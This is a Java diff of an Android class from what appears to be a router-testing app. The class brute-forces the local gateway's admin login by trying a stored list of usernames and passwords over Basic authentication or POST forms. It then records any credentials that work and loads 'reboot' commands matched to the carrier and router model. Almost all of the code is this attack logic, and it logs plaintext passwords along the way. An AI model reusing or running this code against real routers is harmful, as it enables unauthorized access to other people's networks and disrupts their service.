@@ -8,10 +8,8 @@ import java.io.UnsupportedEncodingException;
 import java.net.HttpURLConnection;
 import java.net.MalformedURLException;
 import java.net.URL;
-import java.net.URLConnection;
-import java.net.URLDecoder;
-import java.sql.Connection;
 import java.util.ArrayList;
+import java.util.Iterator;
 import java.util.List;
 
 import org.apache.commons.codec.binary.Base64;
@@ -28,7 +26,6 @@ import org.apache.http.message.BasicNameValuePair;
 import android.app.ProgressDialog;
 import android.content.Context;
 import android.content.Intent;
-import android.content.SharedPreferences;
 import android.os.AsyncTask;
 import android.util.Log;
 import br.pedrofreitas.myroutertestapp.dao.AtaqueDao;
@@ -41,48 +38,30 @@ import br.pedrofreitas.myroutertestapp.manager.Login;
 import br.pedrofreitas.myroutertestapp.manager.Params;
 import br.pedrofreitas.myroutertestapp.manager.PostGet;
 
-public class StartAtaque extends AsyncTask<Void, String, Void> {
+public class StartAtaque extends AsyncTask<Void, String, Integer> {
 
-	private Context mContext;
 	private Intent it;
-
-	private SharedPreferences mShared;
-	private String TAG_ATAQUE_TEMPORARIO_ID = "id_temporario";
-
-	private Dado mDado;
-	
-	private ArrayList<Login> mListLogin;
-	private ArrayList<Ataque> mListAtaque;
-	private ArrayList<PostGet> mListPostGet;
-	private ArrayList<Params> mListParams;
-	
-	private DadoDao mDadoDao;
-	private AtaqueDao mAtaqueDao;
-	private PostGetDao mPostGetDao;
-	private ParamsDao mParamsDao;
-	
+	private Context mContext;
 	private ProgressDialog mProgress;
 	
-	private boolean mConectou;
-	private boolean encontrou;
-	
-	private int mCountUsuarios;
-	private int mCountAtaques;
-	private int mCountPostGet;
-	
-	private long mIdDado;
-	private String mChaveEncontrada;
-	private String mUrlAtaque;
-	private int ataqueSucesso;	
+	private Dado mDado;
 
-		
+	private ArrayList<Login> mListLogin;
+	private ArrayList<Ataque> mListAtaque;
+
+	private boolean mConectou;
 	
-	public StartAtaque(Context mContext, Dado mDado, ArrayList<Login> mListLogin, Intent it, SharedPreferences mShared) {
+	private int mCountAtaques; 
+	
+	
+	public StartAtaque(Context mContext, Dado mDado, ArrayList<Login> mListLogin, ArrayList<Ataque> mListAtaque, int mCountAtaques, Intent it) {
 		this.mContext = mContext;
 		this.mDado = mDado;
 		this.mListLogin = mListLogin;
+		this.mListAtaque = mListAtaque;
+		this.mCountAtaques = mCountAtaques;
+		this.mConectou = false;
 		this.it = it;
-		this.mShared = mShared;
 	}
 	
 	@Override
@@ -102,250 +81,234 @@ public class StartAtaque extends AsyncTask<Void, String, Void> {
 	}
 	
 	@Override
-	protected Void doInBackground(Void... params) {
+	protected Integer doInBackground(Void... params) {
 		android.os.Debug.waitForDebugger();	
+		
+		Ataque auxAtaque = mListAtaque.get(mCountAtaques);		
 
-		//Get conexao
-		try {
-			while(!mConectou) {				
-				byte[] encodedBytes = Base64.encodeBase64(mListLogin.get(mCountUsuarios).getLoginESenha().getBytes());
-				String encoding = new String(encodedBytes);
-				Log.i("ENCODING", encoding);
-				
-				URL url = new URL ("http://" + mDado.getGateway()); 
-				URLConnection connection = (URLConnection) url.openConnection();	
-				connection.setRequestProperty("Authorization", "Basic " + encoding);				
-				InputStream content = (InputStream) connection.getInputStream();
-				InputStreamReader in = new InputStreamReader(content);
-				
-				int numCharsRead;
-				char[] charArray = new char[1024];
-				StringBuffer sb = new StringBuffer();	
-				
-				while ((numCharsRead = in.read(charArray)) > 0) {
-					sb.append(charArray, 0, numCharsRead);
-				}
-				
-				String conexao = sb.toString();
-				Log.i("CONEXAO", conexao);
-				
-				in.close();
-				content.close();
+		PostGetDao mPostGetDao = new PostGetDao(mContext);
+		List<PostGet> mListPostGet = mPostGetDao.getPostEGetWithIdAtaque(auxAtaque.getId());
+		
+		Log.i("LISTA_POSTGET_" + mCountAtaques, "tamanho " + mListPostGet.size());
+		
+		int mCountUsuarios = 0;
+		int mCountPostGet = 0;
+		
+		while(mCountUsuarios < mListLogin.size()) {
+			
+			if(mCountPostGet >= mListPostGet.size()) {
 				mConectou = true;
-			}
-		} catch (MalformedURLException e) {
-			Log.i("ENCODING","MalformedURLException");
-			e.printStackTrace();
-		} catch (IOException e) {
-			Log.i("ENCODING","IOException");
-			e.printStackTrace();
-		} 
-		
-		return null;
-	}
-	
-	@Override
-	protected void onPostExecute(Void result) {
-		super.onPostExecute(result);
-		
-		mDadoDao = new DadoDao(mContext);
-		
-		if(mCountUsuarios == mListLogin.size() && !mConectou) {
-			mDado.setLogin("");
-			mDado.setSenha("");
-			mDadoDao.update(mDado);	
-			
-			SharedPreferences.Editor editor = mShared.edit();
-			editor.putLong(TAG_ATAQUE_TEMPORARIO_ID, mDado.getId());
-			editor.commit();
-		}
-		
-		if(!mConectou) {
-			mCountUsuarios++;
-			new StartAtaque(mContext, mDado, mListLogin, it, mShared).execute();
-		}
-		else {
-			mDado.setLogin(mListLogin.get(mCountUsuarios).getUsuario());
-			mDado.setSenha(mListLogin.get(mCountUsuarios).getSenha());
-			
-			Log.i("DADO", mDado.toString());
-			Log.i("CONECTOU","conectou: " + mConectou);
-			
-			mIdDado = mDadoDao.insert(mDado);
-			
-			mAtaqueDao = new AtaqueDao(mContext);
-			
-			mListAtaque = mAtaqueDao.getAtaquesWithOperadoraETipo(mDado.getOperadora(), "reboot"); 				
-			
-			mCountAtaques = 0;
-			new DoAtaque().execute();
-		}			
-		
-	}
-	
-		private class DoAtaque extends AsyncTask<Void, String, Void> {
-			
-			@Override
-			protected void onPreExecute() {
-				super.onPreExecute();
+				break;
 			}
 			
-			@Override
-			protected void onProgressUpdate(String... values) {
-				mProgress.setMessage(values[0]);
-			}
+			Log.i("LOGIN_" + mCountAtaques + "_" + mCountUsuarios, mListLogin.get(mCountUsuarios).getLoginESenha());
 			
-			@Override
-			protected Void doInBackground(Void... params) {
-				android.os.Debug.waitForDebugger();	
+			mCountPostGet = 0;
+			boolean erro = false;
+
+			while(mCountPostGet < mListPostGet.size() && !erro) {	
 				
-				Ataque aux = mListAtaque.get(mCountAtaques);
-				Log.i("ATAQUE", "Comando[" + mCountAtaques + "] = " + aux.getComando());
-				
-				if(aux.getUsa_chave_de_secao() == 1) {
-					URL urlGetChave;
-					try {
-						urlGetChave = new URL ("http://" + mDado.getGateway() + aux.getCaminho_get_chave());
-						Log.i("ATAQUE", "http://" + mDado.getGateway() + aux.getCaminho_get_chave());
-						byte[] encodedBytes = Base64.encodeBase64((mDado.getLogin() + ":" + mDado.getSenha()).getBytes());
-						String encoding = new String(encodedBytes);
-						
-						URLConnection connection = urlGetChave.openConnection();
-						connection.setRequestProperty("Authorization", "Basic " + encoding);
-						
-						InputStream content = connection.getInputStream();
-						BufferedReader in = new BufferedReader (new InputStreamReader(content));
-						String line;
-						
-						while ((line = in.readLine()) != null && !encontrou) 
-						{
-							Log.i("ATAQUE", line);
-							if(line.contains(mListAtaque.get(mCountAtaques).getForma_da_chave())){
-								String forma = mListAtaque.get(mCountAtaques).getForma_da_chave();
-								Log.i("INTERNET", line);
-								mChaveEncontrada = line.substring(line.indexOf(forma) + forma.length(), line.indexOf(forma) + forma.length() + mListAtaque.get(mCountAtaques).getTamanho_da_chave());
-								Log.i("internet", mChaveEncontrada);
-								encontrou = true;
-								mUrlAtaque = "http://" + mDado.getGateway() + aux.getComando() + mChaveEncontrada;
-							}
-						}					
-						
-					} catch (MalformedURLException e) {
-						e.printStackTrace();
-					} catch (IOException e) {
-						e.printStackTrace();
-					}
+				Iterator iterator = mListPostGet.iterator();
+				PostGet auxPostGet = null;
+				while(iterator.hasNext()) {
+					auxPostGet = (PostGet) iterator.next();
+					if(auxPostGet.getOrdem() > mCountPostGet) break;
 				}
 				
-				if(aux.getUsa_post_ou_get() == 0) {
-					if(mChaveEncontrada == null) {
-						mUrlAtaque = "http://" + mDado.getGateway() + aux.getComando();
-					}
-					URL urlExecutaAtaque;
+				Log.i("POSTGET_" + mCountAtaques + "_" + mCountUsuarios + "_" + mCountPostGet, auxPostGet.toString());
+				
+				if(auxPostGet.getTipo().contains("get")) {	
+					
 					try {
-						byte[] encodedBytes = Base64.encodeBase64((mDado.getLogin() + ":" + mDado.getSenha()).getBytes());
-						String encoding = new String(encodedBytes);
-					
-						mChaveEncontrada = null;
-						urlExecutaAtaque = new URL (URLDecoder.decode(mUrlAtaque));
+						URL url = new URL ("http://" + mDado.getGateway() + auxPostGet.getComando()); 
+						Log.i("URL_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "http://" + mDado.getGateway() + auxPostGet.getComando());
+						HttpURLConnection connection = (HttpURLConnection) url.openConnection();	
+						//connection.setRequestMethod("GET");
+						//connection.setDoOutput(true);				
 						
-						HttpURLConnection connection = (HttpURLConnection) urlExecutaAtaque.openConnection();
-						connection.setRequestMethod("GET");
-						connection.setRequestProperty("Authorization", "Basic " + encoding);
-						Log.i("ATAQUE", "Codigo de retorno " + connection.getResponseCode());
-						InputStream content = connection.getInputStream();
-						
-						BufferedReader in = new BufferedReader (new InputStreamReader(content));
-						String line;
-	
-						ataqueSucesso = mCountAtaques;
-						mCountAtaques++;
-						while ((line = in.readLine()) != null) 
-						{
-							Log.i("RESPOSTA_ATAQUE", line);
-						}					
-						
-					} catch (MalformedURLException e) {
-						Log.i("CONEXAO","MalformedURLException");
-						mCountAtaques++;						
-					} catch (IOException e) {
-						Log.i("CONEXAO","IOException");
-						mCountAtaques++;
-					}			
-				}
-				else {
-					mPostGetDao = new PostGetDao(mContext);
-					
-					mListPostGet = mPostGetDao.getPostEGetWithIdAtaque(aux.getId());
-					HttpClient httpClient = new DefaultHttpClient();
-					
-					while(mListPostGet.size() != mCountPostGet) {
-						PostGet auxPG = mListPostGet.get(mCountPostGet);				
-						
-						HttpPost httpPost = new HttpPost("http://"+mDado.getGateway()+auxPG.getComando());
-						Log.i("PARAMS", "http://" + mDado.getGateway() + auxPG.getComando());
-						mParamsDao = new ParamsDao(mContext);
-						
-						mListParams = mParamsDao.getParamsWithIdComando(auxPG.getId());
-						
-						if(mListParams.size() > 0) {
-							List<NameValuePair> parms = new ArrayList<NameValuePair>(mListParams.size());
-							for(int k = 0; k <= mListParams.size() - 1; k++){
-								parms.add(new BasicNameValuePair(mListParams.get(k).getNome(), mListParams.get(k).getValor()));
-								Log.i("PARAMS", "nome = [" + mListParams.get(k).getNome() + "]; valor = [" + mListParams.get(k).getValor() +"]");
-							}
-							
-							try {
-								httpPost.setEntity(new UrlEncodedFormEntity(parms, "UTF-8"));
-							} catch (UnsupportedEncodingException e1) {
-								e1.printStackTrace();
-							}
+						if(auxPostGet.getUsa_login() == 1) {
+							byte[] encodedBytes = Base64.encodeBase64(mListLogin.get(mCountUsuarios).getLoginESenha().getBytes());
+							String encoding = new String(encodedBytes);
+							Log.i("ENCODING_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, encoding + "(" + mListLogin.get(mCountUsuarios).getLoginESenha() + ")");
+							connection.setRequestProperty("Authorization", "Basic " + encoding);
 						}
 						
+						Log.i("RESPONSE_CODE_" + mCountAtaques + "_" + mCountUsuarios, connection.getResponseCode() +":" + connection.getResponseMessage());
+						
+						erro = true;
+						
+						InputStream content = (InputStream) connection.getInputStream();
+						BufferedReader in = new BufferedReader (new InputStreamReader(content));				
+						String line;							
+						
+						while ((line = in.readLine()) != null) {
+							Log.i("CONEXAO_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, line);
+							if(line.contains(auxPostGet.getToken())) {
+								erro = false;
+								mCountPostGet = auxPostGet.getOrdem();
+							}
+						}
+						in.close();
+						content.close();
+														
+						if(erro) {
+							mCountUsuarios++;
+						}
+					
+					} catch (MalformedURLException e) {
+						Log.e("ERR_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "MalformedURLException", e);
+						erro = true;
+						mCountUsuarios++;
+					} catch (IOException e) {
+						Log.e("ERR_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "IOException", e);
+						erro = true;
+						mCountUsuarios++;
+					}
+				} else {
+					if(auxPostGet.getTipo().contains("post")) {	
+						
+						HttpClient httpClient = new DefaultHttpClient();
+						HttpPost httpPost = new HttpPost("http://" + mDado.getGateway() + auxPostGet.getComando());
+				
+						Log.i("URL_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "http://" + mDado.getGateway() + auxPostGet.getComando());
+						
+						ParamsDao mParamsDao = new ParamsDao(mContext);
+						List<Params> mListParms = mParamsDao.getParamsWithIdComando(auxPostGet.getId());
+						List<NameValuePair>	auxParams;					
+						
+						if(mListParms.size() > 0) {
+							auxParams = new ArrayList<NameValuePair>(mListParms.size());
+							for(int i = 0; i < mListParms.size(); i++) {
+								String name = mListParms.get(i).getNome();
+								String value = mListParms.get(i).getValor();
+								
+								if(auxPostGet.getUsa_login() == 1) {
+									//O parametro e o usuario do login
+									if(mListParms.get(i).getValor().contains("insereUsuario")) {
+										value = mListLogin.get(mCountUsuarios).getUsuario();
+									}
+									
+									//O parametro e a senha do login
+									if(mListParms.get(i).getValor().contains("insereSenha")) {
+										value = mListLogin.get(mCountUsuarios).getSenha();
+									}
+								}
+								
+								auxParams.add(new BasicNameValuePair(name, value));
+								Log.i("PARAM_NAME_" + mCountAtaques + "_" + mCountUsuarios + "_" + i , name);
+								Log.i("PARAM_VALUE_" + mCountAtaques + "_" + mCountUsuarios + "_" + i , value);
+							}
+							try {
+								httpPost.setEntity(new UrlEncodedFormEntity(auxParams, "UTF-8"));
+							} catch(UnsupportedEncodingException e) {
+								Log.e("LOGIN_" + mCountAtaques + "_" + mCountUsuarios , "UnsupportedEncodingException", e);
+							}
+						}							
+						
 						HttpResponse httpResponse;
-						try {					
+						try {
 							httpResponse = httpClient.execute(httpPost);
+							
+							Log.i("RESPONSE_STATUS_" + mCountAtaques + "_" + mCountUsuarios, httpResponse.getStatusLine() + "");
+							
 							HttpEntity responseEntity = httpResponse.getEntity();
 							
-							InputStream content = responseEntity.getContent();
-							BufferedReader in = new BufferedReader (new InputStreamReader (content));
-							String line;
-							mCountPostGet++;
-							ataqueSucesso = mCountAtaques;
+							erro = true;
 							
-							while ((line = in.readLine()) != null) {
-								System.out.println(line);
+							InputStream content = (InputStream)responseEntity.getContent();
+					        BufferedReader in = new BufferedReader (new InputStreamReader (content));
+					        String line;
+					        
+					        while((line = in.readLine()) != null) {
+					        	Log.i("CONEXAO_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, line);
+					        	if(line.contains(auxPostGet.getToken())) {
+									erro = false;
+									mCountPostGet = auxPostGet.getOrdem();
+								}
+					        }
+					        in.close();
+					        content.close();
+
+					        if(erro) {
+								mCountUsuarios++;
 							}
 							
 						} catch (ClientProtocolException e) {
-							e.printStackTrace();
-							mCountPostGet++;
+							Log.e("ERR_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "ClientProtocolException", e);
+							erro = true;
+							mCountUsuarios++;
 						} catch (IOException e) {
-							e.printStackTrace();
-							mCountPostGet++;
-						}					
-					}			
-					mCountAtaques++;	
-				}			
-				
-				return null;
-			}
-			
-			@Override
-			protected void onPostExecute(Void result) {
-				super.onPostExecute(result);
-				if(mCountAtaques < mListAtaque.size()){
-					mCountPostGet = 0;
-					new DoAtaque().execute();
-				}
-				if(mCountAtaques == mListAtaque.size()){
-					Log.i("STATUS","Encerrado");
-				}
-				
-				mProgress.setMessage("Concluído");
-				mProgress.dismiss();
-//		    	startActivity(it);
+							Log.e("ERR_LOGIN_" + mCountAtaques + "_" + mCountUsuarios, "IOException", e);
+							erro = true;
+							mCountUsuarios++;
+						}
+						
+					} else {
+						Log.e("ERR_LOGIN_" + mCountAtaques, "Comando HTTP nao identificado");
+						mConectou = false;
+						break;						
+					}
+				}				
 			}
 		}
+		
+		return mCountUsuarios;
+	}
+	
+	@Override
+	protected void onPostExecute(Integer result) {
+		super.onPostExecute(result);
+		int mCountUsuarios = (int) result;		
 
+		DadoDao mDadoDao = new DadoDao(mContext);
+		Log.i("CONECTOU", mConectou + "");
+		long mIdDadoAtaque;
+		
+		int mCountTipoAtaques = 0;
+		
+		if(mConectou) {
+			mDado.setLogin(mListLogin.get(mCountUsuarios).getUsuario());
+			mDado.setSenha(mListLogin.get(mCountUsuarios).getSenha());
+
+			String fabricanteModelo = mListAtaque.get(mCountAtaques).getFabricante_modelo();
+			mDado.setFabricante_modelo(fabricanteModelo);
+			
+			Log.i("DADO", mDado.toString());
+			
+			mIdDadoAtaque = mDadoDao.insert(mDado);			
+//			mDadoDao.getAll();			
+			
+			AtaqueDao mAtaqueDao = new AtaqueDao(mContext);		
+			ArrayList<Ataque> mListAtaque = mAtaqueDao.getAtaquesWithOperadoraETipoEFabricanteModelo(mDado.getOperadora(), "reboot", fabricanteModelo);
+			
+			Log.i("LISTA_REBOOT", "tamanho " + mListAtaque.size());
+			
+			new FinishAtaque(mContext, mIdDadoAtaque, mListAtaque, mCountTipoAtaques, it).execute();	
+		} else {
+			//A lista de ataques terminou e nao foi possivel logar 
+			if(mCountAtaques == mListAtaque.size()) {
+				mDado.setLogin("nao identificado");
+				mDado.setSenha("nao identificada");
+				mDadoDao.update(mDado);	
+				mIdDadoAtaque = mDadoDao.insert(mDado);		
+				
+//				mDadoDao.getAll();
+				
+				Log.i("DADO", mDado.toString());	
+				
+				mListAtaque = null;
+				mCountAtaques = 0;
+				new FinishAtaque(mContext, mIdDadoAtaque, mListAtaque, mCountTipoAtaques, it).execute();	
+			} else {
+				//Nao foi possivel logar, tenta outro ataque
+				if(mCountAtaques < mListAtaque.size()) {
+//					mDadoDao.getAll();
+					
+					mCountAtaques++;
+					new StartAtaque(mContext, mDado, mListLogin, mListAtaque, mCountAtaques, it).execute();
+				}
+			}
+		}			
+	}
+	
 }
